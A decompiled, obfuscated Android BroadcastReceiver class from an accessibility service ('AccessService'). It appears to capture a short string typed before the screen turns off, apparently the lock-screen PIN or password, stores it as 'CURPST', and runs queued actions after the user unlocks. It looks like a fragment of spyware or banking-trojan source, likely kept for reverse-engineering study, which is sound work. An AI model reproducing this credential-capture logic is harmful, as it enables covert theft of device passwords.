package defpackage;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.mamimobi.AccessService;
import java.util.ArrayList;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/* JADX INFO: loaded from: classes.dex */
public final class y5 extends BroadcastReceiver {
    public final /* synthetic */ int a;
    public final /* synthetic */ Object b;

    public /* synthetic */ y5(int i, Object obj) {
        this.a = i;
        this.b = obj;
    }

    @Override // android.content.BroadcastReceiver
    public final void onReceive(Context context, Intent intent) {
        int i = 2;
        switch (this.a) {
            case 0:
                ((z5) this.b).k();
                return;
            default:
                String action = intent.getAction();
                if ("android.intent.action.SCREEN_ON".equals(action)) {
                    z8 z8Var = (z8) ((tb) this.b).b;
                    if (z8Var == null || !AccessService.j0.get()) {
                        return;
                    }
                    AccessService.a1.postDelayed(new e(i, z8Var), 3000L);
                    return;
                }
                if ("android.intent.action.SCREEN_OFF".equals(action)) {
                    if (((z8) ((tb) this.b).b) != null) {
                        AccessService.k0.set(false);
                        AccessService.s();
                        AtomicBoolean atomicBoolean = AccessService.B0;
                        if (atomicBoolean.get()) {
                            if (AccessService.f0.length() > 16) {
                                AccessService.f0 = "";
                                return;
                            } else {
                                if (!AccessService.f0.isEmpty()) {
                                    fa0.Q0(AccessService.e0, "CURPST", AccessService.f0);
                                }
                                AccessService.f0 = "";
                            }
                        }
                        atomicBoolean.set(false);
                        return;
                    }
                    return;
                }
                if (!"android.intent.action.USER_PRESENT".equals(action) || ((z8) ((tb) this.b).b) == null) {
                    return;
                }
                AccessService.K0.set(false);
                AccessService.k0.set(false);
                AccessService.F0.set(false);
                AccessService accessService = AccessService.e0;
                ArrayList arrayList = sa0.a;
                synchronized (sa0.class) {
                    try {
                        if (!sa0.a.isEmpty()) {
                            AtomicInteger atomicInteger = AccessService.C0;
                            if (atomicInteger.get() == 1) {
                                sa0.c(accessService);
                            } else if (atomicInteger.get() == 2) {
                                sa0.d(accessService);
                            }
                        }
                        if (!sa0.b.isEmpty()) {
                            sa0.e(accessService);
                        }
                    } catch (Throwable th) {
                        throw th;
                    }
                    break;
                }
                AccessService.B0.set(true);
                return;
        }
    }
}
